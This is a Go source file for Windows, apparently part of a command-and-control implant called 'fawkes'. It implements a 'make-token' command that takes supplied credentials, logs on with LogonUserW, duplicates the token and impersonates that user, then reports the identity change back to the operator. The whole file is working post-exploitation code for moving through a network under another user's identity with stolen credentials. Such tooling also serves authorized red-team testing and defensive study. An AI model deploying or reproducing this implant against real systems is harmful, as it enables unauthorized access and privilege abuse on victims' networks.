//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	procLogonUserW = advapi32.NewProc("LogonUserW")
)

const (
	LOGON32_LOGON_INTERACTIVE     = 2
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from credentials and impersonate it"
}

type MakeTokenParams struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	Password string `json:"password"`
}

func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	// Enable required privileges for token manipulation (SeImpersonatePrivilege is critical)
	enableTokenPrivileges()
	
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.Username == "" {
		return structs.CommandResult{
			Output:    "Username is required",
			Status:    "error",
			Completed: true,
		}
	}
	if params.Domain == "" {
		params.Domain = "."
	}
	if params.Password == "" {
		return structs.CommandResult{
			Output:    "Password is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Try to get current token info for comparison (may fail for non-admin)
	var output string
	currentHandle, err := windows.GetCurrentProcess()
	if err == nil {
		var currentToken windows.Token
		err = windows.OpenProcessToken(currentHandle, windows.TOKEN_QUERY, &currentToken)
		if err == nil {
			defer currentToken.Close()
			currentUser, err := currentToken.GetTokenUser()
			if err == nil {
				currentUsername, currentDomain, _, err := currentUser.User.Sid.LookupAccount("")
				if err == nil {
					output = fmt.Sprintf("Old identity: %s\\%s\n", currentDomain, currentUsername)
				}
			}
		}
	}

	// Convert strings to UTF-16
	usernamePtr, err := windows.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := windows.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := windows.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Call LogonUserW to create a new token
	var newTokenHandle windows.Handle
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(LOGON32_LOGON_INTERACTIVE),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&newTokenHandle)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("LogonUserW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Convert to Token type and duplicate as impersonation token
	primaryToken := windows.Token(newTokenHandle)
	
	var hDupToken windows.Token
	err = windows.DuplicateTokenEx(
		primaryToken,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenImpersonation,
		&hDupToken,
	)
	if err != nil {
		primaryToken.Close()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("DuplicateTokenEx failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	
	// Close the primary token, keep the impersonation token
	primaryToken.Close()
	
	// Impersonate using the duplicated impersonation token
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(hDupToken))
	if ret == 0 {
		hDupToken.Close()
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Keep the token handle open - needed for impersonation to remain valid
	// Will be cleaned up on rev2self or process exit

	// Verify impersonation by checking thread token
	var hThreadToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &hThreadToken)
	if err == nil {
		defer hThreadToken.Close()
		threadTokenUser, err := hThreadToken.GetTokenUser()
		if err == nil {
			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
			if err == nil {
				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
			} else {
				output += "Successfully impersonated (verification lookup failed)"
			}
		} else {
			output += "Successfully impersonated (verification query failed)"
		}
	} else {
		// OpenThreadToken failed - add detailed error
		output += fmt.Sprintf("Impersonation may have failed - OpenThreadToken error: %v", err)
	}

	return structs.CommandResult{
		Output:    strings.TrimSpace(output),
		Status:    "success",
		Completed: true,
	}
}
